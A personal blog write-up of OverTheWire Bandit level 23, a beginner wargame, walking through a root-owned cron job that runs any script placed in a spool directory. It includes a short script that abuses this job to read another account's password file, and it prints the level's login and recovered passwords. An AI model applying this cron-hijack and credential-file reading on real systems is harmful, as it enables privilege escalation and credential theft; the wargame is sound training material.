+++
author = "Alex Domnit"
title = 'Bandit-Level 23'
date = 2024-08-18T19:37:30+03:00
draft = false
description = "Writeup"
tags = [
    "CTF",
    "Completed",
]
categories = [
    "Overthewire",
    "Bandit",
]

toc = false
+++

# Level goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.\
NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!\
NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

### Login
*ssh bandit23@bandit.labs.overthewire.org -p 2220*\
*0Zf11ioIjMVN551jX3CmStKLYqjk54Ga*

### Doc
[Usefull read if you are new to bash scripting](https://www.geeksforgeeks.org/bash-scripting-introduction-to-bash-and-bash-scripting/)\
[File permissions](https://www.redhat.com/sysadmin/linux-file-permissions-explained)
### Solution
With the same approach as until now, let`s see what the script being run does.

{{< highlight html >}}
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir	sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
{{< /highlight >}}

You can break the script down line by line and get to the conclusion that basically, it runs all the valid scripts in foo, afterwards deletes all the contents of the directory. The interval for this process is 1 minute so we could just make our own script that **cat\`s** the password for bandit24 and redirects it somewhere we want. We don`t care what happens to the script afterwards. (Chmod +x) makes a bash script executable. (Chmod +r) makes a bash script able to read.

{{< highlight html >}}
bandit23@bandit:/etc/cron.d$ mktemp -d
/tmp/tmp.VKKpqs7HyM
bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.VKKpqs7HyM
bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ touch script.sh
bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ chmod +x script.sh
bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ nano script.sh
{{< /highlight >}}

#### Script:
```
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.VKKpqs7HyM/key.txt
```

Now **cat** the file that came into your directory.

{{< highlight html >}}
bandit23@bandit:/tmp/tmp.VKKpqs7HyM$ cat key.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
{{< /highlight >}}